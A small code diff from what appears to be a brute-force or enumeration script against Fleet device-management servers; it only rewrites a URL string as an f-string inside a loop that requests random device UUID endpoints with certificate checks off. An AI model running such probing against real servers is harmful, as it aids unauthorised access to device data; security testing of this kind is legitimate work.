@@ -31,7 +31,7 @@ log = logging.getLogger()
 # The sleep(4) is necessary to not hit the spray too many requests at the Fleet instance at once. Doing so will result in 500 codes being returned.
 def brute_force():
     for i in range(1, int(args.requests)):
-        target = args.ip + '/api/latest/fleet/device/' + str(uuid.uuid4())
+        target = f'{args.ip}/api/latest/fleet/device/{str(uuid.uuid4())}'
         r = requests.get(target, verify=False, headers=headers)
         log.info(f"{i}: {target}: {r.status_code}")
         time.sleep(4)
